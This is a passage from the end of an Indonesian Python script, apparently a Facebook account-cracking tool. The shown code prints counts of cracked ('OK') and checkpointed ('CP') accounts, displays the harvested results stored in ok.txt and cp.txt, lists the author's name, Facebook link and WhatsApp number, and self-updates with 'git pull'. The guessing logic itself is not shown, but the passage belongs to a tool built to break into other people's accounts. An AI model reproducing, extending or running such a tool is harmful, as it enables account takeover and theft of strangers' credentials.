			print("\r\x1b[0;33m[\x1b[0;37m***\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

### RESULT ###

def results(Dapunta,Krahkrah):
        if len(Dapunta) !=0:
                print(("["+h+"OK"+p+"] :"+h+" "+str(len(Dapunta))))
        if len(Krahkrah) !=0:
                print(("["+h+"CP"+p+"] :"+k+" "+str(len(Krahkrah))))
        if len(Dapunta) ==0 and len(Krahkrah) ==0:
                print("\n")
                print((p+"["+k+"!"+p+"]"+p+" "+m+"Tidak Ada Hasil Ditemukan"))

def ress():
    os.system("clear")
    banner()
    print("["+h+"ROY-VIP SC s7i Opera Mini]")
    print((p+"================================================="))
    print((p+"["+o+"⭐"+p+"]"+p+" Author	: "+k+"Roy Octa Firdaus"))
    print((p+"["+o+"⭐"+p+"]"+p+" Facebook	: "+k+"facebook.com/jbfbold"))
    print((p+"["+o+"⭐"+p+"]"+p+" Whatsapp	: "+k+"+6281318306972"))
    print((p+"================================================="))
    print((p+"\n[ "+o+"Hasil Crack "+h+"OK"+p+" ]"+p))
    try:
        os.system("cat ok.txt")
    except IOError:
        print((p+"["+k+"❌"+p+"]"+p+" "+m+"Tidak Ada Hasil Ditemukan"))
    print((p+"\n[ "+o+"Hasil Crack "+k+"CP"+p+" ]"+p))
    try:
        os.system("cat cp.txt")
    except IOError:
        print((p+"["+k+"❌"+p+"]"+p+" "+m+"Tidak Ada Hasil Ditemukan"))
    input(o+"\n»»» "+k+"ENTER Untuk Kembali" +o+"«««")
    menu()

if __name__=="__main__":
	os.system("git pull")
	menu()
